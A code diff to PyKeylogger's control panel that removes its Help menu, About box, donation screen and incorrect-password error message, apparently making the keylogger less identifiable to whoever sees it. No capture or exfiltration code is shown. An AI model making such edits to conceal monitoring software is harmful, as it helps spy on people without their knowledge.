@@ -28,8 +28,8 @@ from configobj import ConfigObj, flatten_errors
 from validate import Validator
 import myutils
 import webbrowser
-from supportscreen import SupportScreen
-from supportscreen import AboutDialog
+#from supportscreen import SupportScreen
+#from supportscreen import AboutDialog
 import sys
 import version
 import os.path
@@ -62,9 +62,7 @@ class PyKeyloggerControlPanel:
                                                 "Password:", show="*")
         if mypassword != myutils.password_recover(self.panelsettings['General']['Master Password']):
             if mypassword != None:
-                tkMessageBox.showerror("Incorrect Password", 
-                                        "Incorrect Password")
-            return False
+                return False
         else:
             return True
             
@@ -188,22 +186,22 @@ class MainMenu:
                         #label = '%s Settings' % subsection)
         
         ### Help menu
-        self.menubar.addmenu('Help','Help and documentation', name='help')
-        self.menubar.addmenuitem('Help','command',
-                'User manual (opens in web browser)',
-                command=Command(webbrowser.open, "http://pykeylogger.wiki."
-                            "sourceforge.net/Usage_Instructions"),
-                label='User manual')
-        self.menubar.addmenuitem('Help','command',
-                'About PyKeylogger',
-                command=Command(AboutDialog, parent, 
-                            title="About PyKeylogger"),
-                label='About')
-        self.menubar.addmenuitem('Help','command',
-                'Request for your financial support',
-                command=Command(SupportScreen, parent, 
-                            title="Please Support PyKeylogger"),
-                label='Support PyKeylogger!')
+        #self.menubar.addmenu('Help','Help and documentation', name='help')
+        #self.menubar.addmenuitem('Help','command',
+                #'User manual (opens in web browser)',
+                #command=Command(webbrowser.open, "http://pykeylogger.wiki."
+                            #"sourceforge.net/Usage_Instructions"),
+                #label='User manual')
+        #self.menubar.addmenuitem('Help','command',
+                #'About PyKeylogger',
+                #command=Command(AboutDialog, parent, 
+                            #title="About PyKeylogger"),
+                #label='About')
+        #self.menubar.addmenuitem('Help','command',
+                #'Request for your financial support',
+                #command=Command(SupportScreen, parent, 
+                            #title="Please Support PyKeylogger"),
+                #label='Support PyKeylogger!')
         
         # Configure the balloon to displays its status messages in the
         # message bar.
